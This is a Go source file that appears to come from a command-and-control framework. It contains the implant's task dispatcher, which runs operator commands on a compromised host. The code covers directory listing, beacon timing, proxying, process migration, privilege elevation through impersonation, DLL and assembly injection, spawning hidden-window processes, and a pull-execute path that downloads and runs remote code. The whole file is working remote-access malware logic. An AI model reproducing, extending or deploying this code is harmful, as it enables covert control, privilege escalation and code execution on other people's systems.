package c2

import (
	"context"
	"io/fs"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	_ runnable = (*cmd.DLL)(nil)
	_ runnable = (*cmd.Zombie)(nil)
	_ runnable = (*cmd.Process)(nil)
	_ runnable = (*cmd.Assembly)(nil)
)

func defaultClientMux(s *Session, n *com.Packet) bool {
	if n.ID < task.MvRefresh {
		return false
	}
	if cout.Enabled {
		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
	}
	if n.ID == task.MvScript {
		// TODO(dij): Custom handler for "scripts" here.
		//            Scripts are basically an array list of Packet commands.
		//            That should be processed just like any other task and ran
		//            blocking sequentially.
		//
		//            Script packet will contain a single flag that will determine
		//            if:
		//               - Errors stop execution
		//               - Results from packets should be returned or ignored
		//                 - Ignored results will still indicate a yes|no if failed
		//
		//            I'm on the fence if we should care about Migrate packets
		//            NOT being the last packet, since it will invalidate the
		//            tasks after it.
		return true
	}
	if n.ID < RvResult {
		if n.ID == task.MvSpawn {
			go executeTask(s.handleSpawn, s, n)
			return true
		}
		var (
			r      = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
			v, err = internalTask(s, n, r)
		)
		if v {
			if err == nil && n.ID == task.MvMigrate {
				if cout.Enabled {
					s.log.Info("[%s/Mux] Migrate Job %d returned true, not sending response back!", s.ID, n.Job)
				}
				return true
			}
			if err != nil {
				if r.Clear(); cout.Enabled {
					s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, err)
				}
				r.Flags |= com.FlagError
				r.WriteString(err.Error())
			}
			s.queue(r)
			return true
		}
		r.Clear()
		r = nil
	}
	if t := task.Mappings[n.ID]; t != nil {
		go executeTask(t, s, n)
		return true
	}
	if cout.Enabled {
		s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
	}
	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
	r.WriteString("0x404")
	s.queue(r)
	return false
}
func executeTask(t task.Tasker, s *Session, n *com.Packet) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.executeTask()")
	}
	if cout.Enabled {
		s.log.Info("[%s/TasK] Starting Task with JobID %d.", s.ID, n.Job)
	}
	var (
		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
		err = t(s.ctx, n, r)
	)
	if n.Clear(); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/TasK] Received error during JobID %d Task runtime: %s!", s.ID, n.Job, err)
		}
		r.Flags |= com.FlagError
		r.WriteString(err.Error())
	} else if cout.Enabled {
		s.log.Debug("[%s/TasK] Task with JobID %d completed!", s.ID, n.Job)
	}
	if err = s.write(false, r); err != nil {
		if r.Clear(); cout.Enabled {
			s.log.Error("[%s/TasK] Received error sending Task results: %s!", s.ID, err)
		}
	}
}
func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
	switch n.ID {
	case task.MvPwd:
		d, err := syscall.Getwd()
		if err != nil {
			return true, err
		}
		w.WriteString(d)
		return true, nil
	case task.MvCwd:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		return true, syscall.Chdir(device.Expand(d))
	case task.MvList:
		d, err := n.StringVal()
		if err != nil {
			return true, err
		}
		if len(d) == 0 {
			d = "."
		} else {
			d = device.Expand(d)
		}
		s, err := os.Stat(d)
		if err != nil {
			return true, err
		}
		if !s.IsDir() {
			w.WriteUint32(1)
			w.WriteString(s.Name())
			w.WriteInt32(int32(s.Mode()))
			w.WriteInt64(s.Size())
			w.WriteInt64(s.ModTime().Unix())
			return true, nil
		}
		var l []fs.DirEntry
		if l, err = os.ReadDir(d); err != nil {
			return true, err
		}
		w.WriteUint32(uint32(len(l)))
		for i := range l {
			w.WriteString(l[i].Name())
			if x, err := l[i].Info(); err == nil {
				w.WriteInt32(int32(x.Mode()))
				w.WriteInt64(x.Size())
				w.WriteInt64(x.ModTime().Unix())
				continue
			}
			w.WriteInt32(0)
			w.WriteInt64(0)
			w.WriteInt64(0)
		}
		return true, nil
	case task.MvTime:
		j, err := n.Uint8()
		if err != nil {
			return true, err
		}
		d, err := n.Int64()
		if err != nil {
			return true, err
		}
		if j > 100 {
			j = 100
		}
		if s.jitter = j; d > 0 {
			s.sleep = time.Duration(d)
		}
		return true, nil
	case task.MvProxy:
		var (
			v string
			r bool
		)
		if err := n.ReadString(&v); err != nil {
			return true, err
		}
		if err := n.ReadBool(&r); err != nil {
			return true, err
		}
		if r {
			p := s.GetProxy(v)
			if p == nil {
				return true, os.ErrNotExist
			}
			return true, p.Close()
		}
		if ProfileParser == nil {
			return true, xerr.Sub("no Profile parser loaded", 0x8)
		}
		var (
			b string
			k []byte
		)
		if err := n.ReadString(&b); err != nil {
			return true, err
		}
		if err := n.ReadBytes(&k); err != nil {
			return true, err
		}
		p, err := ProfileParser(k)
		if err != nil {
			return true, xerr.Wrap("parse Profile", err)
		}
		if _, err = s.Proxy(v, b, p); err != nil {
			return true, err
		}
		return true, nil
	case task.MvMounts:
		m, err := device.Mounts()
		if err != nil {
			return true, err
		}
		data.WriteStringList(w, m)
		return true, nil
	case task.MvMigrate:
		var (
			k bool
			i string
			p []byte
		)
		if err := n.ReadBool(&k); err != nil {
			return true, err
		}
		if err := n.ReadString(&i); err != nil {
			return true, err
		}
		if err := n.ReadBytes(&p); err != nil {
			return true, err
		}
		e, v, err := readCallable(s.ctx, n)
		if err != nil {
			return true, err
		}
		if _, err = s.MigrateProfile(k, i, p, n.Job, 0, e); err != nil {
			if len(v) > 0 {
				os.Remove(v)
			}
			return true, err
		}
		return true, nil
	case task.MvElevate:
		var f filter.Filter
		if err := f.UnmarshalStream(n); err != nil {
			return true, err
		}
		if f.Empty() {
			f = filter.Filter{Elevated: filter.True}
		}
		return true, device.Impersonate(&f)
	case task.MvRevSelf:
		return true, device.RevertToSelf()
	case task.MvRefresh:
		if cout.Enabled {
			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
		}
		if err := local.Device.Refresh(); err != nil {
			return true, err
		}
		s.Device = *local.Device.Machine
		s.Device.MarshalStream(w)
		return true, nil
	case task.MvProfile:
		if ProfileParser == nil {
			return true, xerr.Sub("no Profile parser loaded", 0x8)
		}
		b, err := n.Bytes()
		if err != nil {
			return true, err
		}
		p, err := ProfileParser(b)
		if err != nil {
			return true, xerr.Wrap("parse Profile", err)
		}
		if cout.Enabled {
			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
		}
		s.swap = p
		return true, nil
	}
	return false, nil
}
func readCallable(x context.Context, r data.Reader) (cmd.Runnable, string, error) {
	var (
		f   *filter.Filter
		err = filter.UnmarshalStream(r, &f)
	)
	if err != nil {
		return nil, "", err
	}
	var (
		e cmd.Runnable
		j bool
		v string
		t uint8
	)
	if err = r.ReadUint8(&t); err != nil {
		return nil, "", err
	}
	// NOTE(dij): We're using the Background context here as we don't want
	//            cancelation for this process as we're creating it to
	//            succeed us (or be independent).
	switch t {
	case task.TvDLL:
		var d *cmd.DLL
		if d, _, j, err = task.DLLUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		if d.Timeout = 0; j {
			v = d.Path
		}
		e = d
	case task.TvZombie:
		var z *cmd.Zombie
		if z, _, j, err = task.ZombieUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		if z.Timeout = 0; j {
			v = z.Path
		}
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		z.SetNoWindow(true)
		z.SetWindowDisplay(0)
		e = z
	case task.TvExecute:
		var p *cmd.Process
		if p, _, err = task.ProcessUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		p.Timeout = 0
		// NOTE(dij): I'm assuming these would be /wanted/ yes?
		p.SetNoWindow(true)
		p.SetWindowDisplay(0)
		e = p
	case task.TvAssembly:
		var a *cmd.Assembly
		if a, _, err = task.AssemblyUnmarshal(context.Background(), r); err != nil {
			return nil, "", err
		}
		a.Timeout = 0
		e = a
	case task.TvPullExecute:
		if v, err = r.StringVal(); err != nil {
			return nil, "", err
		}
		// NOTE(dij): We HAVE to set the Context as the parent to avoid
		//            io locking issues. *shrug* Luckily, the 'Release' function
		//            does it job!
		if e, v, err = task.WebResource(x, nil, false, v); err != nil {
			return nil, "", err
		}
	default:
		if v, err = os.Executable(); err != nil {
			return nil, "", err
		}
		c := cmd.NewProcessContext(context.Background(), v)
		c.SetNoWindow(true)
		c.SetWindowDisplay(0)
		e = c
	}
	if e.SetParent(f); !j {
		v = ""
	}
	return e, v, nil
}
func (s *Session) handleSpawn(x context.Context, r data.Reader, w data.Writer) error {
	var (
		i string
		p []byte
	)
	if err := r.ReadString(&i); err != nil {
		return err
	}
	if err := r.ReadBytes(&p); err != nil {
		return err
	}
	e, v, err := readCallable(s.ctx, r)
	if err != nil {
		return err
	}
	var c uint32
	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
		if len(v) > 0 {
			os.Remove(v)
		}
		return err
	}
	w.WriteUint32(c)
	return nil
}
